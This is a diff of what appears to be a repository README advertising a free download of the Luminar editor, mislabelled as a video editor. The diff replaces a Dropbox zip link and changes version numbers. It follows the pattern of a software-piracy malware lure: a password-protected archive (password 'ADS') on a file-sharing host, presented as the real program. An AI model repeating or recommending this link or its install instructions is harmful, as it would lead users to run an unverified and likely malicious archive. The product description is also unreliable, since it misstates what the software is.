@@ -3,7 +3,7 @@
 
 <p align="center">
   
-<h1 align="center"><a  href="https://www.dropbox.com/s/tb28yzpdedl9ea6/MediaArchive.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/xlrq8u51a3vaviu/SoftPackB.zip?dl=1">DOWNLOAD</a></h1>
 <h4 align="center">Download the program, use the password: ADS To unpack the archive and install the video editor on your computer </h4>
 <p align="center">
   
@@ -12,7 +12,7 @@
 
 <h2 align="center">PROFESSIONAL VIDEO EDITING FOR EVERYONE</h2> 
 
-## [⚡️Luminar Version 2.0.9]:
+## [⚡️Luminar Version 2.2.5]:
 * Find the perfect color
 * NEW AI Augmented Sky Tool.
 * Face Features Detection Network.
@@ -22,7 +22,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡️Luminar Version 2.0.4]:
+## [⚡️Luminar Version 2.2.1]:
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
 * Resetting tools is easier with an increased clickable area for each reset button.
